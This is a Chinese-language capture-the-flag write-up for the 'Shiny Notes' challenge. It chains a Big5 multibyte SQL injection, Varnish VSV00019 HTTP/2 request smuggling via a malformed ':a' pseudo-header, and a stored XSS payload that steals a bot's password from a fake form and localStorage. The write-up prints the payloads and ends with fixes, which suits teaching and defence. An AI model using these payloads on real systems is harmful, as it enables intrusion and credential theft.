# Shiny Notes

## 题目简述

Shiny Notes 是一套经 Hitch、Varnish 8.0.1 转发到 Flask 的加密笔记服务，数据库使用 MariaDB Big5 字符集。浏览器以用户名和密码执行 PBKDF2，服务器只接收派生出的 AES-GCM 密钥。管理机器人每 10 秒创建一个新账号，并把真正的 flag 当作密码；前端同时把密码写入同源 `localStorage.notes_password`。

flag 不在管理笔记或数据库明文中，单独取得 SQL 注入也不能直接读出它。完整利用需要串联三个机制：Big5 多字节 SQL 注入覆盖攻击者自己的加密笔记、Varnish VSV00019 的 HTTP/2 到 HTTP/1 请求走私把该笔记响应错配给机器人、存储型 XSS 再读取机器人浏览器中的密码并写回攻击者笔记。

## 解题过程

先注册一个自有账号，并按前端相同方式计算密钥：

```python
import hashlib

def derive_key(username: str, password: str) -> bytes:
    salt = ("varnished-notes:v1:" + username).encode()
    return hashlib.pbkdf2_hmac("sha256", password.encode(), salt, 200_000, 32)
```

服务把 Base64 解码后的用户名以参数形式传给 MySQL：

```python
username = base64.b64decode(request.form["username"])
cur.execute(
    "SELECT nonce, ciphertext FROM users WHERE username = %s",
    (username,),
)
```

参数化查询通常会转义单引号，但连接字符集被明确设为 Big5。令用户名原始字节以 `a1 27` 开头，客户端转义单引号后会形成 `a1 5c 27`；数据库把 `a1 5c` 当作一个合法 Big5 双字节字符，剩下的 `27` 再次成为未转义单引号。于是可用如下结构闭合字符串并追加语句：

```python
payload = b"\xa1'; " + injection_sql.encode() + b" #"
username_field = base64.b64encode(payload)
```

利用并不尝试窃取未知密钥，而是只修改自己的行。先用已知攻击者密钥把 XSS HTML 加密成合法 AES-GCM 密文，再通过 SQL 注入覆盖该行的 `nonce` 和 `ciphertext`：

```sql
UPDATE users
SET nonce=0x<nonce-base64-as-hex>,
    ciphertext=0x<ciphertext-base64-as-hex>
WHERE username=0x<attacker-username-as-hex>
```

正常保存笔记时，后端会先执行 `html.escape(note_text)`；SQL 更新绕过了这条写入路径。读取时，解密结果进入：

```javascript
document.getElementById("note-view").innerHTML = decryptedNote;
```

因此攻击者自己的 `/note` 响应已经成为可执行的存储型 XSS 页面。

下一步利用 Varnish 8.0.1 的 VSV00019。该版本在启用 HTTP/2 时受影响；[VSV00019 官方公告](https://www.varnish.org/docs/security/vsv00019/)说明其可造成后端请求反同步，并明确将 7.6.0 至 8.0.1 列为受影响版本。漏洞根源是 HPACK 伪首部名称比较只按输入名长度比较，短伪首部 `:a` 会被误认成 `:authority` 的前缀。给它恰好两字节值：

```text
:a: xx
```

内部就会留下一个长度为零的 header 条目。Varnish 降级为 HTTP/1.1 并逐项写首部时，虽然该条目没有内容，仍会写出结尾 `\r\n`，从而在真正首部结束之前插入一个空行。后端把这里当作 headers 终点，而 Varnish 仍认为后续字段属于同一个请求。

官方解题脚本建立原生 TLS/HTTP2 连接，先发送 preface 和 SETTINGS，再在 stream 1 发送如下顺序的 HPACK headers：

```text
:method: POST
:path: /login
:scheme: https
content-type: application/x-www-form-urlencoded
content-length: <aligned-length>
:a: xx
x-pad: <alignment-padding>
```

`content-length` 必须出现在异常伪首部之前。脚本调整 `x-pad` 长度，使提前空行之后由 Varnish 自动生成和剩余的首部字节恰好填满这个长度；随后 HTTP/2 DATA 中的内容便落在第一个后端请求体之外，被 Flask 当成同一复用连接上的第二个 HTTP/1.1 请求：

```http
GET /note HTTP/1.1
Host: 127.0.0.1
Cookie: session=<attacker-session-cookie>
Content-Length: <padding-length>

AAAA...
```

这个走私请求使用攻击者 Cookie，所以 Flask 返回刚刚植入 XSS 的攻击者笔记。Varnish 只把第一个后端响应对应给攻击者；第二个响应留在唯一的复用后端连接中。`varnish.vcl` 又把后端最大连接数设为 1，下一次机器人请求很容易从这条连接读到错位的恶意响应。

XSS 页面需要兼容机器人预期的交互。机器人先查找 `#username`、`#password` 和提交按钮，所以载荷伪造同名控件，并在密码输入事件中保存值：

```html
<input id="username">
<input id="password" type="password"
       oninput="localStorage.setItem('notes_password', this.value)">
<button type="submit">Create account</button>
```

这样即使恶意响应替换了机器人最初访问的注册页，Playwright 仍会把 flag 填入攻击者页面；若响应在稍后阶段错配，原页面也已经由正常脚本把 flag 存入同一个 `localStorage` 键。

最后由 `img` 的 `onerror` 或定时器读取密码。为了不依赖外部回连，载荷调用站点已有的 `encryptField()`，使用攻击者已知 AES 密钥加密 `flag=<password>`，再以同源 `fetch()` 登录攻击者账号并保存为攻击者的新笔记。伪代码为：

```javascript
const p = document.querySelector("#password")?.value
       || localStorage.getItem("notes_password");
const encrypted = await encryptField(attackerKeyHex, "flag=" + p);
await fetch("/login", { method: "POST", credentials: "include", body: attackerLogin });
await fetch("/note", { method: "POST", credentials: "include", body: "enc_note=" + encodeURIComponent(encrypted) });
```

循环投毒并轮询自己的 `/note`。机器人命中错位响应后，攻击者笔记出现：

```text
grey{master_of_http_and_sql_smuggling_UUID}
```

其中真实部署会用实例生成的 UUID 替换末尾占位部分。

## 方法总结

本题的每一段漏洞都只提供有限能力：Big5 注入只能可靠植入自有加密记录，XSS 起初只会在攻击者页面执行，请求走私本身也不会直接读到 flag。三者组合后，走私负责跨会话投递页面，XSS 负责读取浏览器秘密，SQL 注入则负责准备可控且加密格式正确的恶意响应。

VSV00019 不是常见的 `Content-Length`/`Transfer-Encoding` 冲突，而是短 HPACK 伪首部被错误前缀匹配，降级时额外 `\r\n` 提前终止 HTTP/1 首部。修复应同时覆盖各层：升级到不受影响的 Varnish 版本或禁用 HTTP/2 与后端连接复用；数据库与客户端统一使用安全字符集；不要将解密内容交给 `innerHTML`；也不要把敏感密码长期放入任何同源脚本可读的 `localStorage`。
